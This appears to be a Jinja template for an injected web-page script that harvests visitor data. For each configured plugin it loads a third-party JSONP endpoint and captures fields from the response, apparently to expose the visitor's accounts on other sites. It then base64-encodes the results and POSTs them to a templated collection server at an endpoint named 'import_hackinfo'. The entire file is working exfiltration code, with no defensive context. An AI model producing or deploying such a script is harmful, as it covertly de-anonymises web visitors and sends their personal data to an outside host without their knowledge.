result = {};

{% for p in plugins %}
function {{ p.callback }}(data){
    result["{{ p.name }}"] = String(data.{{ p.columns }});
}

var el = document.createElement('script');
el.src = "{{ p.src }}";
el.defer = "defer";

var bo = document.getElementsByTagName('body')[0];
bo.appendChild(el);
{% endfor %}

function send(data) {
    var xhr = new XMLHttpRequest();
    var host = window.location.host;
    var send_data = "host=" + host + "&json_data=" + window.btoa(JSON.stringify(data));
    xhr.open("POST", "//{{ host }}{{ url_for('import_hackinfo') }}", false);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(send_data);
}

setTimeout(function(){ send(result) }, 5000);